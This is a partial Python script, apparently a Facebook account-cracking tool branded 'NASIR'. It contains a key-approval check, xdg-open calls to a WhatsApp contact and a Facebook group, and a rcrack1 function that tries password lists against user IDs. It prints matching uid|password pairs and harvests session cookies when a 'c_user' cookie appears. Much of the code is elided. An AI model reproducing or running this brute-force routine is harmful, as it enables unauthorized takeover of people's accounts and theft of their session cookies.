...
try:
    key1=open("https://github.com/ENC-NASIR/MAX-PRO/blob/main/Aprov.txt",'r').read()
except IOError:
...
if key2 in b:
    ...
    print("Your key  : "+key2)
    print("\n\t\tContact Admin ")
    os.system('xdg-open https://wa.me/+8801783751735')
    exit()
class Main:
    def __init__(self):
        self.id = []
        ...
        os.system("clear")
        print(logo)
        os.system('xdg-open fb://group/1157490851802798?ref=share&mibextid=NSMWBT')
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;31m[%sNASIR\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f"\033[38;5;46m[NASIR-OK💚] {uid}|{ps}")
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
               # print(f"\x1b[38;5;196m[NASIR-CP💔] {uid}|{ps}")
